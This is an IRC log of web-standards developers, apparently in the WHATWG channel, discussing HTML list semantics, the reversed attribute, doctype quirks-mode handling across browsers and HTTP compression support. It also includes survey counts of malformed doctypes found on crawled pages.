/me puts shopping lists into clusters by type of store. two levels of unordered lists.

[17:58:00.0000] <tantek>
the English "i'd want bullets if i gave a list of places i'd been to, even if i ordered them" translates to the CSS: ol.places { list-style:disc }

[17:58:01.0000] <tantek>
because that "want" is presentational

[17:58:02.0000] <Hixie>
sure, but authors aren't going to think that way

[17:58:03.0000] <Hixie>
they'll just use <ul>

[17:59:00.0000] <Hixie>
and pretend that they didn't order the items

[17:59:01.0000] <tantek>
that's fine, then they are saying the order doesn't matter

[17:59:02.0000] <Hixie>
and that they just _happen_ to be in alphabetical order

[17:59:03.0000] <Hixie>
right -- the order doesn't matter, even though there is one intended

[17:59:04.0000] <Hixie>
they don't care about the order, even though they intended one

[18:00:00.0000] <tantek>
no. if they are pretending they didn't order the items, then they didn't order them.

[18:00:01.0000] <tantek>
we can't really assume otherwise.

[18:00:02.0000] <Hixie>
<ul> <li> Apple <li> Banana <li> Cherry </ul>

[18:00:03.0000] <Hixie>
i ordered that list.

[18:00:04.0000] <tantek>
in this case no care = no intent.

[18:00:05.0000] <Hixie>
that i'm using <ul> doesn't change the fact that i did indeed give an order

[18:01:00.0000] <Hixie>
now i might not care if the browser changes the order

[18:01:01.0000] <Hixie>
but i still intended one

[18:02:00.0000] <tantek>
so is the distinction then an intent of default presentational order vs. a semantic order?

[18:02:01.0000] <tantek>
because one could argue your ordering of that list was purely for presentational purposes.  that is, you only intended it for presentational purposes, not for anything semantic.

[18:03:00.0000] <Hixie>
right

[18:03:01.0000] <Hixie>
i ordered it just to make it easier to scan

[18:04:00.0000] <tantek>
ok easy enough to modify my previous statement to take that into account:

[18:04:01.0000] <tantek>
"for whatever reason, if the author intends an order with some meaning behind it beyond just the presentation, then it should be marked up with <ol>"

[18:12:00.0000] <Hixie>
ok, i've tried to update the spec to explain this, along with some examples. http://www.whatwg.org/specs/web-apps/current-work/multipage/section-lists0.html

[18:13:00.0000] <tantek>
/me clicks and hope his browser doesn't lock up.

[18:14:00.0000] <tantek>
BTW, really like the *zero* or more.  About darn time.

[18:14:01.0000] <tantek>
do you need to say "change the meaning of the document"?

[18:14:02.0000] <tantek>
wouldn't just "change the meaning." be sufficient ?

[18:14:03.0000] <Hixie>
change the meaning of what?

[18:15:00.0000] <tantek>
per English implied object resolution rules

[18:15:01.0000] <tantek>
the previous clause

[18:15:02.0000] <tantek>
"changing the order"

[18:15:03.0000] <tantek>
also implied object

[18:15:04.0000] <tantek>
see previous clause

[18:15:05.0000] <tantek>
"where the items have been intentionally ordered"

[18:15:06.0000] <tantek>
also implied object

[18:15:07.0000] <tantek>
see previous clause

[18:16:00.0000] <tantek>
"a list of items"

[18:16:01.0000] <tantek>
resolution complete

[18:16:02.0000] <tantek>
no need to bring "the document" into it.

[18:16:03.0000] <Hixie>
hmmm

[18:16:04.0000] <Hixie>
i _would_ like to remove the document from that setence

[18:16:05.0000] <tantek>
doesn't everyone read/write English like code?

[18:17:00.0000] <tantek>
;)

[18:17:01.0000] <othermaciej>
the way I think of it is <ol> --> numbered list, <ul> --> bulleted list

[18:17:02.0000] <othermaciej>
I would expect that is the typical author's operational understanding as well

[18:17:03.0000] <tantek>
/me smacks othermaciej for presentational-major thinking.

[18:18:00.0000] <Hixie>
othermaciej: i agree, but i think the current definition pretty much matches that

[18:18:01.0000] <tantek>
what do bullets sound like?

[18:18:02.0000] <Hixie>
about 100ms of silence

[18:18:03.0000] <othermaciej>
in normal English speech, nothing, they are just separators

[18:18:04.0000] <othermaciej>
to a screen reader, I dunno

[18:18:05.0000] <tantek>
othermaciej, that's why presentational-major thinking = FAIL.

[18:19:00.0000] <tantek>
Hixie, I suggested ditching the "... of the document." clause from both the <ul> and <ol> sections.

[18:19:01.0000] <Hixie>
"the meaning" on its own just doesn't sound right

[18:19:02.0000] <tantek>
Hixie, "sounding right" is irrelevant. It's a spec. The question is, does it parse?

[18:19:03.0000] <othermaciej>
tantek: I don't see how your argument addresses presentational thinking - it might be an argument against ever using bulleted lists, but I wouldn't buy that conclusion

[18:19:04.0000] <Hixie>
i'm leaving "of the document" until I (or someone else) can think of something better to replace it with

[18:19:05.0000] <othermaciej>
anyway, let me give a practical example

[18:19:06.0000] <tantek>
Hixie, empty space.

[18:19:07.0000] <Hixie>
tantek: actually i consider it sounding right to be of paramount importance to me :-)

[18:19:08.0000] <othermaciej>
sometimes, on the webkit blog, I post lists of new features or bug fixes

[18:20:00.0000] <othermaciej>
usually, I use <ul> for this since they are in no particular order, and mentally speaking, bullets are appropriate

[18:20:01.0000] <othermaciej>
on one occasion, I made a point of the fact that these were 10 features of particular interest

[18:20:02.0000] <othermaciej>
and in that case I used <ol>

[18:20:03.0000] <tantek>
Hixie, if you prefer to place a redundant object resolution place that's ok too, and English depends on redundancy for error correction.

[18:20:04.0000] <tantek>
e.g. s/of the document/of the list of items

[18:20:05.0000] <othermaciej>
I think those were both correct choices but I'd be hard-pressed to argue there is a deep semantic difference

[18:21:00.0000] <tantek>
since that "list of items" is what the object resolution demonstrated above

[18:21:01.0000] <tantek>
that should address the "sounding right" concern.

[18:21:02.0000] <Hixie>
othermaciej: well, if you have any suggested improvement to the text of the spec as it was just changed, i'm certainly open to it

[18:22:00.0000] <Hixie>
tantek: i'm not convinced people would understand what it meant if i did that

[18:22:01.0000] <Hixie>
it's not just the list that would change meaning

[18:22:02.0000] <Hixie>
it's the list plus any content referring to that list

[18:22:03.0000] <Hixie>
e.g. see the examples

[18:22:04.0000] <Hixie>
especially for <ol>

[18:22:05.0000] <othermaciej>
to be honest I didn't read the spec, I just wanted to point out that something based on subtle distinctions of how important or essential an order is would not match the mental model of the typical author

[18:23:00.0000] <Hixie>
othermaciej: i'm not sure defining them as being "when you want bullets" or "when you want numbers" would work either, though

[18:24:00.0000] <othermaciej>
I think the distinction between <ol> and <ul> is not intrinsic to the data, it's about whether the author wants to specify and emphasize the order

[18:24:01.0000] <othermaciej>
depending on authorial intent, you could meaningfully do either for the same list in the same context

[18:24:02.0000] <Hixie>
othermaciej: in your example of numbering them to emphasise the number of items, you are not emphasising the order.

[18:24:03.0000] <othermaciej>
for example, "top 10" lists are pretty arbitrary in their order, many could just as easily be "10 things" lists

[18:25:00.0000] <Hixie>
indeed

[18:25:01.0000] <Hixie>
so that's not emphasising the order

[18:25:02.0000] <othermaciej>
fair enough

[18:25:03.0000] <othermaciej>
although if the spec says that in that situation you should use numbers in the text content or <ul> with CSS counter styling, I am not sure it will be followed

[18:26:00.0000] <othermaciej>
(also not sure that it would ever be an improvement to do that)

[18:26:01.0000] <Hixie>
i would say that in those contexts the current definition works better

[18:26:02.0000] <Hixie>
the current definition is that the order matters

[18:26:03.0000] <Hixie>
and if you refer to "number 5", clearly the order matters

[18:26:04.0000] <Hixie>
since changing the order would change what each one was numbered

[18:26:05.0000] <othermaciej>
that's true

[18:26:06.0000] <Hixie>
<ol> is now defined as "The ol element represents a list of items, where the items have been intentionally ordered, such that changing the order would change the meaning of the document."

[18:26:07.0000] <othermaciej>
sometimes the numbers aren't there for order, but to provide referents for external references

[18:26:08.0000] <Hixie>
right

[18:27:00.0000] <othermaciej>
(which might not even be in the same document)

[18:27:01.0000] <othermaciej>
that seems like a good enough definition

[18:27:02.0000] <Hixie>
the current definition just says they've been intentionally ordered, not that they are ordered according to any grand scheme

[18:27:03.0000] <Hixie>
i like it

[18:27:04.0000] <Hixie>
yeah

[18:27:05.0000] <Hixie>
it has withstood your attempt at disproving it :-P

[18:28:00.0000] <othermaciej>
I wasn't trying to disprove it

[18:28:01.0000] <othermaciej>
I hadn't even read it at the time I commented

[18:28:02.0000] <othermaciej>
I was just reading scrollback and thought it sounded a bit abstract

[18:28:03.0000] <Hixie>
i know, i'm just teasing :-)

[18:30:00.0000] <othermaciej>
if I were trying to disprove something, you'd know it :-)

[18:30:01.0000] <Hixie>
hah

[19:25:00.0000] <Hixie>
/me adds more examples and their hidden meanings to the spec

[20:02:00.0000] <Hixie>
hm

[20:02:01.0000] <Hixie>
<ol reversed> is an interesting proposal

[20:02:02.0000] <Hixie>
i wonder how the browser vendors would react to it

[20:24:00.0000] <Hixie>
/me bcc's 50-odd people

[20:25:00.0000] <Hixie>
ok that was a reply to 100+ e-mails

[20:25:01.0000] <Hixie>
yay

[20:26:00.0000] <Hixie>
what's next... maybe section/p/hr stuff... maybe em/strong stuff...

[20:26:01.0000] <Hixie>
hm

[20:27:00.0000] <tantek>
Hixie, rather than reversed, why not allow a list-increment?

[20:27:01.0000] <tantek>
default: +1

[20:28:00.0000] <tantek>
-1 to achieve reverse

[20:29:00.0000] <Hixie>
reversed does more than just change the step increment

[20:29:01.0000] <Hixie>
it also changes the start value

[20:29:02.0000] <Hixie>
we can add step later if there's a use case for it

[20:29:03.0000] <tantek>
sure but there already is a start attr

[20:29:04.0000] <Hixie>
right but reversed changes the default start value

[20:29:05.0000] <tantek>
the use case is lists that are numbered in large increments

[20:29:06.0000] <tantek>
see patent docs

[20:29:07.0000] <tantek>
which often use increments of 2 or 10

[20:29:08.0000] <Hixie>
they can use value=""

[20:29:09.0000] <tantek>
for paragraphs etc

[20:30:00.0000] <Hixie>
decrementing to 1 is a much more common case

[20:30:01.0000] <tantek>
they can't often use "value" because that requires too much fix-up

[20:30:02.0000] <tantek>
for the same reason we don't ask all numbered lists to use "value"

[20:30:03.0000] <tantek>
on every list item

[20:30:04.0000] <Hixie>
the whole point of large numbers in those cases is that you don't need fixup to add an additional paragraph

[20:31:00.0000] <Hixie>
hence why value="" is the most appropriate

[20:31:01.0000] <Hixie>
(if you really want to use a list in those cases)

[20:32:00.0000] <tantek>
people will just use hacks then to get auto-numbered by +10 lists

[20:32:01.0000] <tantek>
like <li>...</li> then 9 empty <li> etc.

[20:32:02.0000] <Hixie>
i haven't seen that happen

[20:32:03.0000] <tantek>
then CSS to only have every 10th item show up

[20:32:04.0000] <Hixie>
i have seen peple use hacks for stepping down to -1, though

[20:32:05.0000] <Hixie>
(namely using scripts to do it)

[20:33:00.0000] <tantek>
yeah, i've seen them, but can't find any examples offhand

[20:33:01.0000] <Hixie>
see the e-mail i just sent whatwg for the research that was done to back up reversed="" -- it wasn't as extensive as with other cases like some of the research i've done, but it was eye-opening nonetheless

[20:33:02.0000] <tantek>
if i do i'll let you know

[20:33:03.0000] <Hixie>
cool, thanks

[20:35:00.0000] <Hixie>
lord, microsoft adcenter is trying to hire me

[20:35:01.0000] <Hixie>
/me informs them politely that he's happy working for the company that's whipping their asses already

[20:37:00.0000] <tantek>
Hixie, I do also remember running into the need to do reverse lists in the past as well, and having to resort to "value" manually to do it in my own markup.

[20:45:00.0000] <othermaciej>
Hixie: they probably got you from a list of people working for the company that's whipping their asses

[20:52:00.0000] <tantek>
question: is this a valid URL for this channel: irc://irc.freenode.net/whatwg ?

[21:04:00.0000] <takkaria>
tantek: I believe so

[21:05:00.0000] <tantek>
I wasn't able to use that "company that's whipping asses" to find an irc: URL validator.

[21:14:00.0000] <othermaciej>
tantek: there's two different expired drafts floating around

[21:14:01.0000] <othermaciej>
tantek: by the latest one, it should be irc://irc.freenode.net/#whatwg

[21:15:00.0000] <jruderman>
without a # works in more clients

[21:15:01.0000] <othermaciej>
or irc://irc.freenode.net/whatwg,ischannel

[21:16:00.0000] <othermaciej>
(not sure if anything implements either of those rules

[21:16:01.0000] <othermaciej>
)

[23:27:00.0000] <Hixie>
ok here goes

[23:27:01.0000] <Hixie>
63 elements on sections

[23:27:02.0000] <Hixie>
and related subjects

[23:27:03.0000] <Hixie>
/me beings replying

[23:32:00.0000] <othermaciej>
63 elements?

[23:32:01.0000] <othermaciej>
or do you mean 63 emails?

[23:32:02.0000] <othermaciej>
hello roc

[23:33:00.0000] <Hixie>
er yes

[23:33:01.0000] <Hixie>
e-mails

[23:33:02.0000] <roc>
hello

[23:34:00.0000] <jruderman>
roc!

[23:43:00.0000] <Hixie>
hey roc

[00:28:00.0000] <virtuelv>
hsivonen: yt?

[00:29:00.0000] <hsivonen>
virtuelv: yes

[00:29:01.0000] <virtuelv>
do you have any plans on releasing the source for your validator?

[00:30:00.0000] <hsivonen>
virtuelv: it's already Free Software with a publicly readable svn repo

[00:30:01.0000] <hsivonen>
virtuelv: I don't have immediate plans to cut version numbered release packages

[00:30:02.0000] <virtuelv>
hsivonen: Hm. I totally missed that

[00:31:00.0000] <hsivonen>
virtuelv: http://about.validator.nu/#src

[00:31:01.0000] <virtuelv>
hsivonen: thanks

[00:32:00.0000] <virtuelv>
Would be helpful if there was a ToC on the about page

[00:36:00.0000] <hsivonen>
virtuelv: ok. I'll add one in the next update of that page that I have in preparation

[00:56:00.0000] <Dashiva>
Dmitry wants to hold votes on his proposals, this could get messy

[00:57:00.0000] <Lachy>
Hixie, the top 10 movie list example contains movies that really shouldn't be in the top 10, and is missing others that should. :-)

[00:57:01.0000] <Lachy>
also, there's no example of using the start attribute given

[00:57:02.0000] <Hixie>
pah

[00:57:03.0000] <Hixie>
(re the movies)

[00:57:04.0000] <Hixie>
and yeah

[00:57:05.0000] <Hixie>
i need to add more examples

[00:58:00.0000] <Hixie>
i just added examples for the things people asked about

[00:59:00.0000] <Dashiva>
Hixie: Maybe you should take a pointer from FORTRAN and start labeling your step sequences, that way it's easy to say which sequence to abort :)

[01:00:00.0000] <Lachy>
you need an example that shows <ol start=100 reversed>, and explain why long reversed lists should ideally include a start attribute to help with incremental rendering

[01:11:00.0000] <Hixie>
Dashiva: maybe

[01:11:01.0000] <Hixie>
Lachy: if you really think so, send mail :-)

[01:12:00.0000] <Hixie>
/me is well into a big e-mail on sections by now

[01:30:00.0000] <Lachy>
Hixie, I will later

[01:31:00.0000] <Hixie>
k

[01:34:00.0000] <hendry>
what is the (code) name for the IE7 engine? e.g. Firefox -> Gecko

[01:35:00.0000] <hsivonen>
hendry: Trident

[01:35:01.0000] <hsivonen>
hendry: since IE 4.0

[01:37:00.0000] <hendry>
though aren't there more codenames as the engine in 6 is different to 7, if you know what i mean. i just re-read all that stuff that came up last month.

[01:37:01.0000] <hendry>
i should just re-read :)

[01:37:02.0000] <Hixie>
the code name for the IE engine is trident

[01:37:03.0000] <Hixie>
as far as know it hasn't got version-specific names

[01:38:00.0000] <madmoose>
Maybe for IE8 they'll rename it "Tridents".

[01:39:00.0000] <Hixie>
hah

[01:41:00.0000] <jgraham_>
/me wonders if they'll fulfil nominative-determinism and stop shipping new engines once they reach three

[01:42:00.0000] <jgraham_>
s/new/more/

[01:42:01.0000] <Hixie>
hm?

[01:42:02.0000] <jgraham_>
Trident == Three pronged, no?

[01:45:00.0000] <Hixie>
oh, that name

[01:45:01.0000] <Hixie>
i thought you meant IE8

[01:45:02.0000] <Hixie>
and couldn't work out how 8 would mean 3

[01:55:00.0000] <annevk>
DOM travelsal is complicated :(

[01:55:01.0000] <Hixie>
yeah

[01:55:02.0000] <annevk>
traversal, even

[01:55:03.0000] <Hixie>
you wanna fix it?

[01:55:04.0000] <annevk>
heh

[01:56:00.0000] <Hixie>
it needs an editor

[01:56:01.0000] <Hixie>
with a big hammer and a bag full of nails

[01:56:02.0000] <Hixie>
and a lot of duct tape

[01:56:03.0000] <annevk>
i've got quite a list of specs already

[01:57:00.0000] <annevk>
can you tell if http://tc.labs.opera.com/dom/traversal/002.htm is valid or not?

[01:58:00.0000] <annevk>
opera had some minor failures, but i'm not sure if my minimized test is ok

[01:58:01.0000] <Hixie>
i dunno

[01:58:02.0000] <Hixie>
it took me days to do the acid3 test that does mutations in the handler

[01:58:03.0000] <Hixie>
and i'm still not sure it's correct

[01:58:04.0000] <annevk>
ouch

[01:58:05.0000] <annevk>
that's the test i'm talking about :)

[01:58:06.0000] <Hixie>
:-)

[01:59:00.0000] <Hixie>
someone should write up the traversal spec unambiguously

[01:59:01.0000] <Hixie>
then we'd know

[02:01:00.0000] <jgraham_>
Hixie: You should produce a list of specs that you _don't_ think need an editor, as it would be simpler to refer to that than a list of specs that do

[02:01:01.0000] <jgraham_>
;)

[02:04:00.0000] <annevk>
how did the moz call go?

[02:04:01.0000] <annevk>
cookies?

[02:07:00.0000] <Hixie>
jgraham_: no, i have a list of specs that need an editor

[02:07:01.0000] <Hixie>
jgraham_: it's relatively short

[02:08:00.0000] <Hixie>
jgraham_: (companion specifications on the whatwg wiki)

[02:08:01.0000] <jgraham_>
Hixie: I wasn't quite being serious :)

[02:08:02.0000] <Hixie>
:-)

[02:12:00.0000] <Philip`>
/me wondered why his web server had TCP connections with apache2-hixie.hixie.dreamhost.com, before finding that that's just what whatwg.org reverse-resolves into

[02:14:00.0000] <Philip`>
By the way, http://status.whatwg.org/annotate-web-apps.php doesn't look so good

[02:17:00.0000] <Philip`>
/me wonders if people who carefully make XHTML sites in PHP do something to disable/redirect warning/error messages like that, or if they just assume they're never going to occur

[02:22:00.0000] <zcorpan>
Philip`: what? php error messages are supposed to be xhtml compatible!! they changed <br> to <br />!1

[02:35:00.0000] <Lachy>
Hixie, yt?

[02:36:00.0000] <Lachy>
Hixie, in the first note in the dl elmement section, you're missing the word "using"

[02:37:00.0000] <Lachy>
oh, actually, you wrote "using accidentally" instead of "accidentally using"

[02:56:00.0000] <Hixie>
thanks will fix

[03:06:00.0000] <Lachy>
Hixie, why do you refer to <dl> as an association list where it's defined, but then refer to description list everywhere else?

[03:11:00.0000] <Hixie>
carelessness, probably

[03:11:01.0000] <Hixie>
aw man, henri is asking for a rewrite of the outline algorithm

[03:11:02.0000] <Hixie>
and there i was thinking i'd get through all this feedback without having to do any work

[03:12:00.0000] <Hixie>
i guess i'll reply to this tomorrow

[03:12:01.0000] <annevk>
that must be a subset of his feedback then

[03:13:00.0000] <annevk>
lots of parsing questions stuff prolly requires work

[03:13:01.0000] <annevk>
s/stuff//

[03:14:00.0000] <zcorpan>
annevk: it seems you read "this" as "his"

[03:14:01.0000] <annevk>
yeah

[03:31:00.0000] <zcorpan>
the first example on <figure> reminds me of <listing>

[03:40:00.0000] <zcorpan>
/me notes that the 3rd example has <p/><img/><p/>

[03:41:00.0000] <annevk>
that reminds me of a frontpage commercial

[03:41:01.0000] <annevk>
http://annevankesteren.nl/2004/02/microsoft-frontpage-and-valid-html

[03:42:00.0000] <annevk>
"</p>That's right. We said FrontPage.</p>"

[04:12:00.0000] <zcorpan>
Hixie: you got a 9 too much, so it would be 5000 people, not 500 :)

[04:15:00.0000] <Philip`>
<pre><code>

[04:15:01.0000] <Philip`>
interface PrimaryCore {

[04:15:02.0000] <Philip`>
seems sort of wrong, since it'll have a blank line at the top

[04:15:03.0000] <Philip`>
(since <pre> just deletes a directly following newline character token, which doesn't happen in this case)

[04:16:00.0000] <Philip`>
Also it says void sendData(in sequence&lt;byte> data); which looks wrong

[04:17:00.0000] <zcorpan>
Philip`: what wrong about it?

[04:17:01.0000] <Philip`>
Oh, whoops, nothing

[04:17:02.0000] <Philip`>
I forgot it was showing HTML code

[04:20:00.0000] <annevk>
the <aside> example that's also a self-reference contains a too early </pre>

[05:20:00.0000] <Philip`>
/me wonders if there's a web server anywhere which sends Content-Encoding: deflate, so he can test his code on it

[05:30:00.0000] <hsivonen>
Philip`: curiously, x-gzip (as opposed to gzip) happens

[05:37:00.0000] <hsivonen>
Philip`: when I implemented gzip support for V.nu, I figured that clients support gzip so well that supporting deflate and x-gzip is not worthwhile.

[05:37:01.0000] <hsivonen>
Philip`: it seems to me that deflate is mostly a dead letter in the spec

[05:38:00.0000] <hsivonen>
Philip`: so my guess is that your software doesn't need to support deflate

[06:05:00.0000] <Philip`>
Hmm, I suppose I might as well keep untested deflate support since it's only two lines of code and it'll let me see how many servers attempt to send deflate responses

[06:06:00.0000] <Philip`>
It looks like only Opera sends accept-encoding:x-gzip

[06:07:00.0000] <Philip`>
(and nothing sends 'compress')

[06:08:00.0000] <SadEagle>
konq does x-gzip as well. But no compress. 

[06:08:01.0000] <Philip`>
/me adds x-gzip to see what happens

[06:09:00.0000] <Philip`>
SadEagle: Aha, okay

[06:09:01.0000] <Philip`>
Konqueror 3.5.something sends "x-gzip, x-deflate, gzip, deflate"

[06:10:00.0000] <Philip`>
but x-deflate seems a bit peculiar since it e.g. isn't mentioned in RFC2616

[06:12:00.0000] <Philip`>
/me wonders how many people handle accept-encoding:gzip,identity;q=0

[06:26:00.0000] <annevk>
If I have to boxes A and B. A is located at 0,0 and B at 10,10. I can now speak about the distance between the top edge of A and the top edge of B (being 10). Now if B is located at -10,-10 this distance should be -10. Is saying "The distance between the top edge of A and the top edge B" enough or should I say "downward distance"

[06:26:01.0000] <annevk>
suggestions?

[06:28:00.0000] <zcorpan>
if it can be negative then it's not a distance

[06:28:01.0000] <Philip`>
"The y coordinate of the top edge of A minus the y coordinate of the top edge of B"?

[06:28:02.0000] <annevk>
i guess that's best, yes

[06:29:00.0000] <Philip`>
Or skip the annoyingly verbose English and say A<sub>T</sub><sub>y</sub> - B<sub>T</sub><sub>y</sub>

[06:30:00.0000] <Philip`>
Actually, skip the annoyingly verbose HTML too and say $A_T_y - B_T_y$

[06:30:01.0000] <annevk>
heh

[06:31:00.0000] <zcorpan>
Hixie: it should be attribute boolean reversed, not attribute long reversed

[06:32:00.0000] <zcorpan>
Hixie: s/is present/is absent/ in the paragraph defining reversed=''

[06:50:00.0000] <Philip`>
Oh, it turns out there's at least one site which sends 'delate' content, and it makes my code die with "unknown compression method"

[06:53:00.0000] <zcorpan>
'delate'?

[06:53:01.0000] <Philip`>
Uh

[06:54:00.0000] <Philip`>
'deflate'

[06:56:00.0000] <Philip`>
Aha, it works when I add a second parameter and do new InflaterInputStream(in, new Inflater(true));

[07:04:00.0000] <Philip`>
In 1024 pages, I see 2 deflate and 141 gzip

[07:04:01.0000] <Philip`>
(when sending accept-encoding:gzip,deflate)

[07:17:00.0000] <Philip`>
In 8192, I see 12 deflate and 1195 gzip

[07:21:00.0000] <Philip`>
In 16384, 16 and 2439

[07:21:01.0000] <Philip`>
deflate is not entirely negligible

[07:26:00.0000] <Philip`>
http://www.toua-u.ac.jp/ - "Video/X-Flv: .flv" - is that meant to do anything?

[07:30:00.0000] <Philip`>
http://www.superexpressgonzalez.com/ - P3P: policyref="http://www.tiendavirtual.ws/w3c/p3p.xml" CP="NOI DSP COR NID PUB NOR" """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

[07:52:00.0000] <Philip`>
<!doctype php public "-//w3c//dtd xphp 1.0 transitional//en" "http://www.w3.org/tr/xphp1/dtd/xphp1-transitional.dtd">

[07:53:00.0000] <Philip`>
<!doctype html public "guest house,jersey,haven,guest house,accommodation,jersey,channel islands,saint helier,british ">

[07:53:01.0000] <Philip`>
<!doctype html public "-//w3c//dtd xhtml 1.0 transitional//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd" "http://www.w3.org/tr/html4/loose.dtd">

[07:53:02.0000] <Philip`>
The world is a crazy place :-(

[07:54:00.0000] <annevk>
fortunately we have unambigious rules to interpret it

[07:55:00.0000] <zcorpan>
i've seen "php" doctypes before

[07:55:01.0000] <Philip`>
http://www.thermaglaze.com/ - <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd" [ <!ATTLIST a target CDATA #IMPLIED> ]> - that's another way to work around the nonconformance of <a target>

[07:55:02.0000] <zcorpan>
people change all their files from .html to .php and do a global s/html/php/

[07:56:00.0000] <zcorpan>
(which suggests there are some <php> elements out there, too)

[07:56:01.0000] <Philip`>
http://www.pervasive.com/ - <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 5.0//EN" />

[07:57:00.0000] <Philip`>
<!doctype html public "&#150;//w3c//dtd html 3.2//en"> - hmm, bad copy-and-paste

[07:57:01.0000] <Philip`>
(from Word, presumably)

[07:58:00.0000] <zcorpan>
or search-replace

[07:58:01.0000] <Philip`>
Oh, I suppose that's possible

[08:13:00.0000] <Philip`>
Hmm, IE6 and HTML5 (or non-IE browsers) seem to differ in doctype moding for ~1% of pages

[08:15:00.0000] <Philip`>
The most significant difference is <!doctype html public "-//w3c//dtd html 4.0 transitional//en" "http://www.w3.org/tr/rec-html40/loose.dtd"> (on ~0.5% of pages)

[08:17:00.0000] <zcorpan>
Philip`: do you have pointers to the remaining ~0.5%?

[08:23:00.0000] <Philip`>
276 – <!doctype html public "-//w3c//dtd html 4.0 transitional//en" "http://www.w3.org/tr/rec-html40/loose.dtd">

[08:24:00.0000] <Philip`>
69 – <!doctype html public "-//"aol hometown//html 3.0 transitional//en">

[08:24:01.0000] <Philip`>
45 – <!doctype html public "-//w3c//dtd html 4.0 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">

[08:24:02.0000] <Philip`>
34 – <!doctype html public "-//w3c//dtd xhtml 1.0 transitional//en" system "http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd"/>

[08:24:03.0000] <Philip`>
22 – <!doctype html public "-//w3c//dtd html 4.0 transitional//en" "http://www.w3.org/tr/html40/loose.dtd">

[08:24:04.0000] <Philip`>
19 – <!doctype html public "-//w3c//dtd html 4.0 frameset//en" "http://www.w3.org/tr/rec-html40/frameset.dtd">

[08:24:05.0000] <Philip`>
zcorpan: ^ Those are the counts (out of 62592 pages) of the top doctypes that are IE standards and HTML5 quirks

[08:24:06.0000] <Philip`>
/me will upload some page with all the details later

[08:24:07.0000] <zcorpan>
Philip`: thanks!

[08:25:00.0000] <Philip`>
(These are all pages from dmoz.org, so there's still an uncorrected bias towards certain sites/domains)

[08:26:00.0000] <Philip`>
(Also, by "HTML5" I mean HTML5 plus http://lists.w3.org/Archives/Public/public-html/2008Jan/0006.html )

[08:34:00.0000] <Philip`>
/me wonders how many pages he should download

[08:39:00.0000] <gsnedders>
how many implementations are there of RDF?

[08:41:00.0000] <Philip`>
I get quite a few "Corrupt GZIP trailer" errors

[08:45:00.0000] <Philip`>
<button onlick="..."> doesn't quite do what I want

[09:03:00.0000] <Philip`>
<!doctype html public "-//w3c//dtd xhtml 1.0 transitional//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd" />

[09:04:00.0000] <Philip`>
HTML5 say quirks, Firefox/Opera say limited-quirks

[09:04:01.0000] <Philip`>
*says

[09:05:00.0000] <Philip`>
(IE says limited-quirks too, and I can't be bothered to test Safari)

[09:10:00.0000] <zcorpan>
um... how come safari doesn't do quirks mode in the live dom viewer?

[09:11:00.0000] <Philip`>
How are you testing that?

[09:11:01.0000] <zcorpan>
<style>body{background:f00}</style>

[09:13:00.0000] <zcorpan>
safari seems to not care about garbage after the system identifier

[09:14:00.0000] <zcorpan>
so html5 is in disagreement with browsers about trailing /> in the doctype

[09:14:01.0000] <Philip`>
Safari seems to think "foo<!doctype html>" is non-quirks

[09:14:02.0000] <zcorpan>
mozilla too

[09:15:00.0000] <aroben>
zcorpan: Philip`: what version of Safari are you testing?

[09:15:01.0000] <zcorpan>
probably an old one

[09:16:00.0000] <zcorpan>
3.0.2 (522.13.1)

[09:16:01.0000] <aroben>
ok

[09:16:02.0000] <aroben>
that's good

[09:16:03.0000] <aroben>
WebKit trunk just recently changed to match HTML 5's doctype parsing much more closely

[09:16:04.0000] <aroben>
I'm glad you're testing the behavior of Safari 3

[09:16:05.0000] <Philip`>
I see 88 pages with <!doctype .../> out of 109434

[09:16:06.0000] <zcorpan>
aroben: would be interesting to know if your changes breaks anything

[09:18:00.0000] <aroben>
zcorpan: yes, it would ;-)

[09:18:01.0000] <aroben>
zcorpan: I'm sure we'll find out eventually

[09:18:02.0000] <zcorpan>
i would also like to know if pages that use something other than //en in the FPI are rendered correctly in firefox/safari

[09:19:00.0000] <gsnedders>
/me is confused. how is the billion laughs attack that many? if 0 is 2 chars, then is repeated twice, it becomes four, then that is repeated twice you get eight, etc. only doubling.

[09:20:00.0000] <zcorpan>
gsnedders: double it enough times and it will become a billion pretty quickly :)

[09:20:01.0000] <gsnedders>
but with only 30 it gets to only 120, I thinks

[09:20:02.0000] <gsnedders>
that can't be right

[09:20:03.0000] <gsnedders>
/me is being dumb

[09:22:00.0000] <gsnedders>
doubling starting at two goes up in powers of two.

[09:22:01.0000] <gsnedders>
duh.

[09:23:00.0000] <gsnedders>
which means laugh30 is $2^{30+1}$ characters

[09:24:00.0000] <Philip`>
I see 8 pages with <!doctype html> out of 109434

[09:31:00.0000] <annevk>
mine mine mine

[09:34:00.0000] <Philip`>
135 pages have Server "ZX_Spectrum/1997 (Sinclair_BASIC)"

[09:35:00.0000] <SadEagle>
coolness.

[09:39:00.0000] <Philip`>
Oh, they're all subdomains of narod.ru

[09:39:01.0000] <Philip`>
so there's only one web server running on a Spectrum :-(

[09:58:00.0000] <Philip`>
http://philip.html5.org/data/doctypes-2.html

[09:58:01.0000] <Philip`>
(The "Test" thing probably doesn't work in WebKit)

[10:00:00.0000] <gsnedders>
yeah, it just reportd non-quirks for all

[10:01:00.0000] <gsnedders>
Philip`: <http://bugs.webkit.org/show_bug.cgi?id=15062>

[10:14:00.0000] <hsivonen>
hrm. Google docs reject Firefox 3 and tells me to get Firefox 1.5.0.12 or newer

[10:15:00.0000] <svl>
Google does lots of bad sniffing for "Firefox" instead of looking at "Gecko" :(

[10:17:00.0000] <svl>
(And Firefox 3 at present is still "minefield" (I'm pretty certain, though didn't check))

[10:19:00.0000] <aroben>
Philip`: here's a test for what mode the page is in that works in WebKit: http://trac.webkit.org/projects/webkit/browser/trunk/LayoutTests/fast/doctypes/resources/TestDoctype.js?rev=30431

[10:29:00.0000] <gavin>
svl: nightly builds are "Minefield"

[10:29:01.0000] <gavin>
betas are "Firefox"

[10:29:02.0000] <hsivonen>
I tried with a beta, fwiw

[10:31:00.0000] <gsnedders>
